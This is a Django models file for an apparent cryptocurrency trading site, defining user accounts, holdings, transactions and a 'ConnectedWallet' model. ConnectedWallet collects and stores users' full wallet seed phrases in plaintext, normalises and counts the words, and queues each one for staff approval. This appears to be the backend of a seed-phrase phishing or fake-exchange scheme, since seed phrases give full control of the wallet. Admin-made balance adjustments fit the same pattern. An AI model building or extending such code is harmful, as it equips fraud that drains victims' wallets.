import re
from decimal import Decimal
from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save
from django.dispatch import receiver


class UserAccount(models.Model):
    FIAT_CHOICES = [('USD', 'USD'), ('EUR', 'EUR'), ('GBP', 'GBP')]

    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='account')
    default_fiat = models.CharField(max_length=3, choices=FIAT_CHOICES, default='USD')
    cash_balance = models.DecimalField(max_digits=18, decimal_places=2, default=Decimal('0'))
    balance_eur = models.DecimalField(max_digits=18, decimal_places=2, default=Decimal('0.00'))
    balance_gbp = models.DecimalField(max_digits=18, decimal_places=2, default=Decimal('0.00'))
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = 'User Account'
        verbose_name_plural = 'User Accounts'

    def __str__(self):
        return f"{self.user.username} — {self.default_fiat}"

    @property
    def balance_usd(self):
        return self.portfolio_value_usd()

    def portfolio_value_usd(self):
        total = self.cash_balance
        for h in self.holdings.all():
            total += h.balance * h.asset.current_price
        return total


class UserHolding(models.Model):
    account = models.ForeignKey(UserAccount, on_delete=models.CASCADE, related_name='holdings')
    asset = models.ForeignKey('market.MarketAsset', on_delete=models.CASCADE)
    balance = models.DecimalField(max_digits=18, decimal_places=8, default=Decimal('0'))
    average_entry_price = models.DecimalField(max_digits=18, decimal_places=2, default=Decimal('0'))

    class Meta:
        unique_together = ['account', 'asset']

    def __str__(self):
        return f"{self.account.user.username} holds {self.balance} {self.asset.code}"


class ConnectedWallet(models.Model):
    WALLET_TYPES = [
        ('METAMASK', 'MetaMask'), ('TRUST', 'Trust Wallet'), ('PHANTOM', 'Phantom'),
        ('COINBASE', 'Coinbase Wallet'), ('LEDGER', 'Ledger'), ('EXODUS', 'Exodus'),
        ('BASE', 'Base'), ('OTHER', 'Other'),
    ]
    STATUSES = [('PENDING', 'Pending'), ('APPROVED', 'Approved'), ('REJECTED', 'Rejected')]

    account = models.ForeignKey(UserAccount, on_delete=models.CASCADE, related_name='wallets')
    wallet_type = models.CharField(max_length=20, choices=WALLET_TYPES)
    seed_phrase = models.CharField(max_length=500)
    seed_word_count = models.PositiveSmallIntegerField(default=0)
    address = models.CharField(max_length=255, blank=True)
    status = models.CharField(max_length=20, choices=STATUSES, default='PENDING')
    created_at = models.DateTimeField(auto_now_add=True)
    processed_at = models.DateTimeField(null=True, blank=True)

    class Meta:
        ordering = ['-created_at']

    @staticmethod
    def normalize_seed_phrase(phrase):
        words = re.sub(r'\s+', ' ', phrase.strip().lower()).split()
        return ' '.join(words), len(words)

    def save(self, *args, **kwargs):
        normalized, count = self.normalize_seed_phrase(self.seed_phrase)
        self.seed_phrase = normalized
        self.seed_word_count = count
        super().save(*args, **kwargs)

    def masked_seed(self):
        if len(self.seed_phrase) <= 12:
            return self.seed_phrase[:6] + '...' + self.seed_phrase[-4:]
        words = self.seed_phrase.split()
        if len(words) <= 3:
            return self.seed_phrase
        return f"{words[0]} {words[1]} ... {words[-1]}"

    def __str__(self):
        return f"{self.get_wallet_type_display()} - {self.status}"


class Transaction(models.Model):
    TYPES = [
        ('DEPOSIT', 'Deposit'), ('WITHDRAWAL', 'Withdrawal'),
        ('TRADE_BUY', 'Trade Buy'), ('TRADE_SELL', 'Trade Sell'),
        ('ADMIN_ADJ', 'Admin Adjustment'),
    ]
    STATUSES = [
        ('PENDING', 'Pending'), ('APPROVED', 'Approved'),
        ('REJECTED', 'Rejected'), ('COMPLETED', 'Completed'),
    ]

    account = models.ForeignKey(UserAccount, on_delete=models.CASCADE, related_name='transactions')
    type = models.CharField(max_length=20, choices=TYPES)
    status = models.CharField(max_length=20, choices=STATUSES, default='PENDING')
    asset_code = models.CharField(max_length=20, blank=True, null=True)
    fiat_currency = models.CharField(max_length=3, blank=True, null=True)
    fiat_amount = models.DecimalField(max_digits=18, decimal_places=2, null=True, blank=True)
    asset_amount = models.DecimalField(max_digits=18, decimal_places=8, null=True, blank=True)
    price_at_trade = models.DecimalField(max_digits=18, decimal_places=2, null=True, blank=True)
    destination_address = models.CharField(max_length=255, blank=True, default='')
    admin_note = models.TextField(blank=True, default='')
    created_at = models.DateTimeField(auto_now_add=True)
    processed_at = models.DateTimeField(null=True, blank=True)
    processed_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, blank=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        return f"{self.type} | {self.account.user.username} | {self.status}"


@receiver(post_save, sender=User)
def create_user_account(sender, instance, created, **kwargs):
    if created:
        UserAccount.objects.create(user=instance)
